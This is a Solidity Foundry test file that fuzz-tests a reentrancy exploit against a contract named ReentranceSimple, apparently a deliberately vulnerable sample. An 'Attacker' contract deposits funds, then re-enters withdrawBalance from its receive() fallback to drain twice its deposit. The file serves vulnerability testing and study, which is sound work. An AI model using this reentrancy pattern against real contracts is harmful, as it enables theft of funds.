
// SPDX-License-Identifier: MIT
pragma solidity 0.8.29;

import {Test} from "../lib/forge-std/src/Test.sol";
import {ReentranceSimple} from "../src/ReentranceSimple.sol";

contract TestReentrancyReentranceSimple is Test {
    ReentranceSimple public _contractUnderTest;
    Attacker public _attacker;

    function setUp() public {
        _contractUnderTest = new ReentranceSimple();
        _attacker = new Attacker(address(_contractUnderTest));
    }

    function test_attackerCallsMultipleTimes(uint256 attackVal) public {
        // --- 1. Constraints & Pitfall Avoidance ---
        vm.assume(attackVal > 0);
        vm.assume(attackVal <= type(uint128).max / 4);

        // --- 2. State Configuration (Pre-Condition) ---
        // No specific state required beyond deposits

        // --- 3. Funding ---
        // Fund the Victim contract so it has ETH to steal
        vm.deal(address(_contractUnderTest), attackVal * 2);
        
        // Fund the Attacker contract
        vm.deal(address(_attacker), attackVal * 2);

        // Fund the Test Contract
        vm.deal(address(this), attackVal * 2);

        // --- 4. Trigger Attack ---
        _attacker.setupAttack{value: attackVal}(attackVal);
        _attacker.attack(attackVal);

        // --- 5. Verify Success ---
        assertTrue(_attacker.exploitSucceeded(), "Reentrancy attack failed: exploitSucceeded flag was not set.");
    }

    receive() external payable {}
}

contract Attacker {
    ReentranceSimple public victim;
    uint256 public attackCallCount;
    bool public exploitSucceeded;
    uint256 public initialSnapshot;
    uint256 public storedAttackVal;

    constructor(address victimAddress) {
        victim = ReentranceSimple(victimAddress);
    }

    function setupAttack(uint256 val) public payable {
        attackCallCount = 1;
        exploitSucceeded = false;
        storedAttackVal = val;
        
        // Deposit funds into the victim contract to establish a balance
        victim.addToBalance{value: val}();
    }

    function attack(uint256 val) public {
        // 1. Capture Initial State - store attacker's ETH balance before attack
        initialSnapshot = address(this).balance;

        // 2. Store the value for the re-entrant call
        storedAttackVal = val;

        // 3. Call the vulnerable function
        victim.withdrawBalance();

        // 4. Verify Success Conditions
        // The attack succeeded if we received more ETH than we deposited
        // Due to reentrancy, we should have withdrawn twice (2 * val)
        // but only deposited once (val), so net gain is val
        if (address(this).balance > initialSnapshot + val) {
            exploitSucceeded = true;
        }
    }

    receive() external payable {
        if (attackCallCount < 2) {
            attackCallCount++;
            // Re-enter the vulnerable withdraw function
            victim.withdrawBalance();
        }
    }
}
